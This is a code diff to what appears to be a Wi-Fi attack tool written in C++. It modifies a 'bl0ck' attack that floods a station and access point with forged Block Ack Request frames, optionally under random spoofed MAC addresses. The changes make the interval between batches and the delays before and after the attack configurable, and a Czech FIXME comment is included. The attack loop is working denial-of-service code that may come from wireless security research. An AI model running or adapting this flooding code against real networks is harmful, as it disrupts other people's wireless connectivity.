@@ -85,7 +85,7 @@ static void bars_sniffer_thread(const HWAddress<6> &sta_mac, const string &iface
 }
 
 void block(const HWAddress<6> &sta_mac, const HWAddress<6> &ap_hw, const string &iface, const int frame_in_batch,
-			const string &attack_type, const int duration_sec, const bool is_random
+			const string &attack_type, const int duration_sec, const bool is_random, const int ms_interval
 ){
 	assert(attack_type == "BAR" || attack_type == "BA" || attack_type == "BARS");
 
@@ -106,10 +106,8 @@ void block(const HWAddress<6> &sta_mac, const HWAddress<6> &ap_hw, const string 
 		});
 	}
 
-	const auto start_time = steady_clock::now();
-	const auto end_time = start_time + seconds(duration_sec);
-
 	int iteration = 0;
+	const auto end_time =  steady_clock::now() + seconds(duration_sec);
 	while(steady_clock::now() < end_time){
 		try{
 			const HWAddress<6> sta_hw = is_random ? hw_capabilities::rand_mac() : sta_mac;
@@ -122,7 +120,7 @@ void block(const HWAddress<6> &sta_mac, const HWAddress<6> &ap_hw, const string 
 
 			log(LogLevel::DEBUG, "Sending batch {}", iteration);
 			for(int i = 0; i < frame_in_batch; ++i) sender.send(block_frame, iface_obj);
-			this_thread::sleep_for(100ms);
+			this_thread::sleep_for(microseconds(ms_interval));
 			iteration++;
 		} catch(const exception &e){
 			log(LogLevel::ERROR, "Error sending frame at iteration {}: {}", iteration, e.what());
@@ -193,13 +191,14 @@ void run_bl0ck_attack(RunStatus &rs){
 	const int duration = att_cfg.at("attack_time_sec").get<int>();
 	const int frame_in_batch = att_cfg.at("frame_in_batch").get<int>();
 	const bool is_random = att_cfg.at("random").get<bool>();
+	const int ms_interval = att_cfg.at("ms_interval"); //FIXME need get? (asi ne, tak projít všechny zbyteřné get v projektu)
 
 	rs.start_observers();
 
 	log(LogLevel::INFO, "Block Attack START (Type: {}, Frames: {})", bl0ck_att_type, frame_in_batch);
-	this_thread::sleep_for(seconds(5));
-	block(STA_mac, AP_mac, iface, frame_in_batch, bl0ck_att_type, duration, is_random);
-	this_thread::sleep_for(seconds(5));
+	this_thread::sleep_for(seconds(att_cfg.at("sleep_before_sec")));
+	block(STA_mac, AP_mac, iface, frame_in_batch, bl0ck_att_type, duration, is_random, ms_interval);
+	this_thread::sleep_for(seconds(att_cfg.at("sleep_after_sec")));
 	log(LogLevel::INFO, "Block Attack END");
 
 	//rs.process_manager.stop_all();
